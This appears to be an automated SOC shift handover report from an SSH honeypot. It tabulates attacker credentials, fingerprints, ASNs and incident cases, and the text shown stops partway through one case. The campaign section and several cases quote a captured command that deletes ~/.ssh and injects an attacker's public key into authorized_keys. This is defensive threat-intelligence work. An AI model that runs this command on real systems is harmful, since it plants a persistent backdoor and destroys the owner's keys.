# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-09 |
| **Generated At** | 2026-06-09T11:20:38Z |
| **Shift Time** | 11:20 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **958** |
| Confirmed Threats | **945** |
| False Positives Filtered | **13** (1.4%) |
| Unique Attacker IPs | **37** |
| Countries of Origin | **14** |
| High Severity Cases | **148** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **810** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **364** |
| Unique Credential Pairs | **134** |
| Unique Usernames | **80** |
| Unique Passwords | **110** |
| Successful Auth Pairs | **84** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 148 |
| `345gs5662d34` | 74 |
| `ubuntu` | 5 |
| `ftpuser` | 3 |
| `nginx` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 74 |
| `3245gs5662d34` | 73 |
| `` | 15 |
| `123456` | 12 |
| `1234` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 74 |
| `root` | `3245gs5662d34` | 73 |
| `GET / HTTP/1.0` | `` | 3 |
| `OPTIONS / HTTP/1.0` | `` | 3 |
| `OPTIONS / RTSP/1.0` | `` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `!p@ssw0rd` | `125.138.175.113` | 2026-06-09T07:54:56 |
| `root` | `3245gs5662d34` | `125.138.175.113` | 2026-06-09T07:54:59 |
| `root` | `Ym123456` | `154.83.196.237` | 2026-06-09T09:09:41 |
| `root` | `3245gs5662d34` | `154.83.196.237` | 2026-06-09T09:09:46 |
| `root` | `Abc123abc` | `43.166.137.151` | 2026-06-09T09:12:52 |
| `root` | `3245gs5662d34` | `43.166.137.151` | 2026-06-09T09:12:58 |
| `root` | `Qwerty2024!` | `152.32.252.65` | 2026-06-09T09:13:28 |
| `root` | `3245gs5662d34` | `152.32.252.65` | 2026-06-09T09:13:31 |
| `root` | `czj123456` | `45.160.84.79` | 2026-06-09T09:14:45 |
| `root` | `3245gs5662d34` | `45.160.84.79` | 2026-06-09T09:14:52 |
| `root` | `123456789q` | `152.32.252.65` | 2026-06-09T09:15:30 |
| `root` | `123@123A` | `154.217.253.190` | 2026-06-09T09:15:52 |
| `root` | `3245gs5662d34` | `154.217.253.190` | 2026-06-09T09:15:58 |
| `root` | `13081987` | `45.160.84.79` | 2026-06-09T09:19:17 |
| `root` | `P@$$W0rd` | `81.192.46.49` | 2026-06-09T09:19:28 |
| `root` | `3245gs5662d34` | `81.192.46.49` | 2026-06-09T09:19:31 |
| `root` | `zse4xdr5` | `152.32.252.65` | 2026-06-09T09:19:31 |
| `root` | `P@$$W0rd` | `43.166.137.151` | 2026-06-09T09:21:04 |
| `root` | `czj123456` | `152.32.252.65` | 2026-06-09T09:21:21 |
| `root` | `qqwweerr` | `45.160.84.79` | 2026-06-09T09:21:22 |
| `root` | `Aa147258...` | `154.217.253.190` | 2026-06-09T09:21:29 |
| `root` | `bigred` | `43.166.137.151` | 2026-06-09T09:22:37 |
| `root` | `Tencent@2026` | `45.160.84.79` | 2026-06-09T09:23:31 |
| `root` | `Abcd#1234` | `152.32.252.65` | 2026-06-09T09:25:03 |
| `root` | `Abcd#1234` | `45.160.84.79` | 2026-06-09T09:25:41 |
| `root` | `pppppp` | `152.32.252.65` | 2026-06-09T09:26:58 |
| `root` | `asd@123123` | `43.166.137.151` | 2026-06-09T09:27:34 |
| `root` | `11235813` | `45.160.84.79` | 2026-06-09T09:27:51 |
| `root` | `Cx123456.` | `154.217.253.190` | 2026-06-09T09:28:42 |
| `root` | `Aa147258@` | `152.32.252.65` | 2026-06-09T09:28:49 |
| `root` | `11235813` | `152.32.252.65` | 2026-06-09T09:30:52 |
| `root` | `ubuntu2025` | `154.217.253.190` | 2026-06-09T09:32:35 |
| `root` | `hola` | `43.166.137.151` | 2026-06-09T09:32:40 |
| `root` | `P@ssw1rd` | `152.32.252.65` | 2026-06-09T09:32:53 |
| `root` | `QWEqwe!@#123` | `43.166.137.151` | 2026-06-09T09:34:14 |
| `root` | `Vy@123456789` | `154.217.253.190` | 2026-06-09T09:34:23 |
| `root` | `zzidc2024` | `81.192.46.49` | 2026-06-09T09:35:04 |
| `root` | `Lc123456` | `45.160.84.79` | 2026-06-09T09:36:35 |
| `root` | `Abc123abc` | `81.192.46.49` | 2026-06-09T09:36:47 |
| `root` | `zzidc2024` | `43.166.137.151` | 2026-06-09T09:37:31 |
| `root` | `Password!` | `81.192.46.49` | 2026-06-09T09:40:22 |
| `root` | `13081987` | `152.32.252.65` | 2026-06-09T09:40:33 |
| `root` | `Password!` | `43.166.137.151` | 2026-06-09T09:40:45 |
| `root` | `QWEasd123!@#` | `154.217.253.190` | 2026-06-09T09:41:41 |
| `root` | `hola` | `81.192.46.49` | 2026-06-09T09:42:08 |
| `root` | `Yw@123456` | `154.217.253.190` | 2026-06-09T09:43:35 |
| `root` | `P@ssw0rd12` | `152.32.252.65` | 2026-06-09T09:44:21 |
| `root` | `P@ssw1rd` | `45.160.84.79` | 2026-06-09T09:45:07 |
| `root` | `Passw0rd@2024` | `154.217.253.190` | 2026-06-09T09:45:30 |
| `root` | `qqwweerr` | `152.32.252.65` | 2026-06-09T09:46:14 |
| `root` | `P@ssw0rd12` | `45.160.84.79` | 2026-06-09T09:47:16 |
| `root` | `bigred` | `81.192.46.49` | 2026-06-09T09:47:23 |
| `root` | `Lc123456` | `152.32.252.65` | 2026-06-09T09:48:08 |
| `root` | `password123@` | `152.32.252.65` | 2026-06-09T09:50:08 |
| `root` | `My123456@` | `154.217.253.190` | 2026-06-09T09:51:12 |
| `root` | `Aa147258@` | `45.160.84.79` | 2026-06-09T09:51:36 |
| `root` | `QWEqwe!@#123` | `81.192.46.49` | 2026-06-09T09:52:30 |
| `root` | `ABcd@1234` | `154.217.253.190` | 2026-06-09T09:53:03 |
| `root` | `zse4xdr5` | `45.160.84.79` | 2026-06-09T09:53:45 |
| `root` | `asdf1234..` | `152.32.252.65` | 2026-06-09T09:54:05 |
| `root` | `potato123` | `43.166.137.151` | 2026-06-09T09:54:13 |
| `root` | `asdf1234..` | `45.160.84.79` | 2026-06-09T09:55:56 |
| `root` | `potato123` | `81.192.46.49` | 2026-06-09T09:57:45 |
| `root` | `Admin@2025` | `154.217.253.190` | 2026-06-09T09:58:34 |
| `root` | `ubuntulinux` | `152.32.252.65` | 2026-06-09T10:01:39 |
| `root` | `Toor` | `154.217.253.190` | 2026-06-09T10:02:13 |
| `root` | `ubuntulinux` | `45.160.84.79` | 2026-06-09T10:02:28 |
| `root` | `asd@123123` | `81.192.46.49` | 2026-06-09T10:02:57 |
| `root` | `password123@` | `45.160.84.79` | 2026-06-09T10:04:40 |
| `root` | `Hr123456` | `154.217.253.190` | 2026-06-09T10:06:01 |
| `root` | `123456789q` | `45.160.84.79` | 2026-06-09T10:06:52 |
| `root` | `Tencent@2026` | `152.32.252.65` | 2026-06-09T10:07:28 |
| `root` | `pppppp` | `45.160.84.79` | 2026-06-09T10:09:06 |
| `root` | `Qwerty2024!` | `45.160.84.79` | 2026-06-09T10:15:36 |
| `root` | `root-123` | `68.183.236.1` | 2026-06-09T10:23:04 |
| `root` | `3245gs5662d34` | `68.183.236.1` | 2026-06-09T10:23:07 |
| `root` | `lenovo@123` | `103.13.206.100` | 2026-06-09T10:35:51 |
| `root` | `3245gs5662d34` | `103.13.206.100` | 2026-06-09T10:35:54 |
| `root` | `112` | `103.13.206.100` | 2026-06-09T10:38:27 |
| `root` | `ubuntu` | `101.96.203.55` | 2026-06-09T10:47:26 |
| `root` | `Start123` | `103.13.206.100` | 2026-06-09T10:51:55 |
| `root` | `william` | `103.13.206.100` | 2026-06-09T11:08:29 |
| `root` | `!Password123` | `103.13.206.100` | 2026-06-09T11:11:10 |
| `root` | `123456.qq` | `103.13.206.100` | 2026-06-09T11:19:19 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **958** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 329 |
| Nmap scanner | 14 |
| OpenSSH | 7 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 325 | 14 |
| `e788c657d1a2...` | Mirai/variant | 12 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 2 | 2 |
| `b4b8ae3d7241...` | Mirai/variant | 2 | 1 |
| `a20aced7c982...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 325 | 14 | Mirai/variant |
| `e788c657d1a2...` | Nmap scanner | 12 | 1 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 6 | 1 | — |
| `873a5fb5fedc...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `b4b8ae3d7241...` | libssh | 2 | 1 | Mirai/variant |
| `a20aced7c982...` | Nmap scanner | 2 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 2 | 2 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 74 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `81.192.46.49`, `45.160.84.79`, `154.83.196.237`, `103.13.206.100`, `43.166.137.151`, `154.217.253.190`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **37** |
| Unique ASNs | **27** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS22773` | Cox Communications Inc. | 2 | LOW |
| `AS137266` | CHINATELECOM Hubei province Wuhan 5G network | 1 | LOW |
| `AS6713` | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (148)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a5d4e32a1252

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-06-09 07:54 |
| **Last Seen** | 2026-06-09 07:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:54:55` | `cowrie.session.connect` |
| `2026-06-09 07:54:55` | `cowrie.client.version` |
| `2026-06-09 07:54:55` | `cowrie.client.kex` |
| `2026-06-09 07:54:56` | `cowrie.login.success` |
| `2026-06-09 07:54:56` | `cowrie.session.params` |
| `2026-06-09 07:54:56` | `cowrie.command.input` |
| `2026-06-09 07:54:56` | `cowrie.command.failed` |
| `2026-06-09 07:54:56` | `cowrie.log.closed` |
| `2026-06-09 07:54:56` | `cowrie.session.params` |
| `2026-06-09 07:54:56` | `cowrie.command.input` |
| `2026-06-09 07:54:56` | `cowrie.session.file_download` |
| `2026-06-09 07:54:56` | `cowrie.log.closed` |
| `2026-06-09 07:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-486881b5d44d

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-06-09 07:54 |
| **Last Seen** | 2026-06-09 07:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:54:58` | `cowrie.session.connect` |
| `2026-06-09 07:54:58` | `cowrie.client.version` |
| `2026-06-09 07:54:59` | `cowrie.client.kex` |
| `2026-06-09 07:54:59` | `cowrie.login.success` |
| `2026-06-09 07:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2b5ccd8b472

| Field | Detail |
|---|---|
| **Source IP** | `154.83.196[.]237` |
| **First Seen** | 2026-06-09 09:09 |
| **Last Seen** | 2026-06-09 09:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:09:40` | `cowrie.session.connect` |
| `2026-06-09 09:09:40` | `cowrie.client.version` |
| `2026-06-09 09:09:41` | `cowrie.client.kex` |
| `2026-06-09 09:09:41` | `cowrie.login.success` |
| `2026-06-09 09:09:42` | `cowrie.session.params` |
| `2026-06-09 09:09:42` | `cowrie.command.input` |
| `2026-06-09 09:09:42` | `cowrie.command.failed` |
| `2026-06-09 09:09:42` | `cowrie.log.closed` |
| `2026-06-09 09:09:42` | `cowrie.session.params` |
| `2026-06-09 09:09:42` | `cowrie.command.input` |
| `2026-06-09 09:09:42` | `cowrie.session.file_download` |
| `2026-06-09 09:09:42` | `cowrie.log.closed` |
| `2026-06-09 09:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.196[.]237` to AbuseIPDB if not already reported
- [ ] Block `154.83.196[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46379b3b186f

| Field | Detail |
|---|---|
| **Source IP** | `154.83.196[.]237` |
| **First Seen** | 2026-06-09 09:09 |
| **Last Seen** | 2026-06-09 09:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:09:45` | `cowrie.session.connect` |
| `2026-06-09 09:09:45` | `cowrie.client.version` |
| `2026-06-09 09:09:45` | `cowrie.client.kex` |
| `2026-06-09 09:09:46` | `cowrie.login.success` |
| `2026-06-09 09:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.196[.]237` to AbuseIPDB if not already reported
- [ ] Block `154.83.196[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6f8e380f1ae

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:12 |
| **Last Seen** | 2026-06-09 09:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:12:51` | `cowrie.session.connect` |
| `2026-06-09 09:12:51` | `cowrie.client.version` |
| `2026-06-09 09:12:51` | `cowrie.client.kex` |
| `2026-06-09 09:12:52` | `cowrie.login.success` |
| `2026-06-09 09:12:53` | `cowrie.session.params` |
| `2026-06-09 09:12:53` | `cowrie.command.input` |
| `2026-06-09 09:12:53` | `cowrie.command.failed` |
| `2026-06-09 09:12:53` | `cowrie.log.closed` |
| `2026-06-09 09:12:54` | `cowrie.session.params` |
| `2026-06-09 09:12:54` | `cowrie.command.input` |
| `2026-06-09 09:12:54` | `cowrie.session.file_download` |
| `2026-06-09 09:12:54` | `cowrie.log.closed` |
| `2026-06-09 09:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e23e52a88484

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:12 |
| **Last Seen** | 2026-06-09 09:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:12:57` | `cowrie.session.connect` |
| `2026-06-09 09:12:57` | `cowrie.client.version` |
| `2026-06-09 09:12:57` | `cowrie.client.kex` |
| `2026-06-09 09:12:58` | `cowrie.login.success` |
| `2026-06-09 09:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c4a95be1ddb

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:13 |
| **Last Seen** | 2026-06-09 09:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:13:28` | `cowrie.session.connect` |
| `2026-06-09 09:13:28` | `cowrie.client.version` |
| `2026-06-09 09:13:28` | `cowrie.client.kex` |
| `2026-06-09 09:13:28` | `cowrie.login.success` |
| `2026-06-09 09:13:28` | `cowrie.session.params` |
| `2026-06-09 09:13:28` | `cowrie.command.input` |
| `2026-06-09 09:13:28` | `cowrie.command.failed` |
| `2026-06-09 09:13:29` | `cowrie.log.closed` |
| `2026-06-09 09:13:29` | `cowrie.session.params` |
| `2026-06-09 09:13:29` | `cowrie.command.input` |
| `2026-06-09 09:13:29` | `cowrie.session.file_download` |
| `2026-06-09 09:13:29` | `cowrie.log.closed` |
| `2026-06-09 09:13:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aa4433db3d0

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:13 |
| **Last Seen** | 2026-06-09 09:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:13:31` | `cowrie.session.connect` |
| `2026-06-09 09:13:31` | `cowrie.client.version` |
| `2026-06-09 09:13:31` | `cowrie.client.kex` |
| `2026-06-09 09:13:31` | `cowrie.login.success` |
| `2026-06-09 09:13:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d48a61d7d10

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:14 |
| **Last Seen** | 2026-06-09 09:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:14:43` | `cowrie.session.connect` |
| `2026-06-09 09:14:43` | `cowrie.client.version` |
| `2026-06-09 09:14:44` | `cowrie.client.kex` |
| `2026-06-09 09:14:45` | `cowrie.login.success` |
| `2026-06-09 09:14:45` | `cowrie.session.params` |
| `2026-06-09 09:14:45` | `cowrie.command.input` |
| `2026-06-09 09:14:45` | `cowrie.command.failed` |
| `2026-06-09 09:14:46` | `cowrie.log.closed` |
| `2026-06-09 09:14:46` | `cowrie.session.params` |
| `2026-06-09 09:14:46` | `cowrie.command.input` |
| `2026-06-09 09:14:47` | `cowrie.session.file_download` |
| `2026-06-09 09:14:47` | `cowrie.log.closed` |
| `2026-06-09 09:14:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4472efde0ef4

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:14 |
| **Last Seen** | 2026-06-09 09:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:14:50` | `cowrie.session.connect` |
| `2026-06-09 09:14:50` | `cowrie.client.version` |
| `2026-06-09 09:14:51` | `cowrie.client.kex` |
| `2026-06-09 09:14:52` | `cowrie.login.success` |
| `2026-06-09 09:14:52` | `cowrie.session.closed` |

**Recommended Actions:**
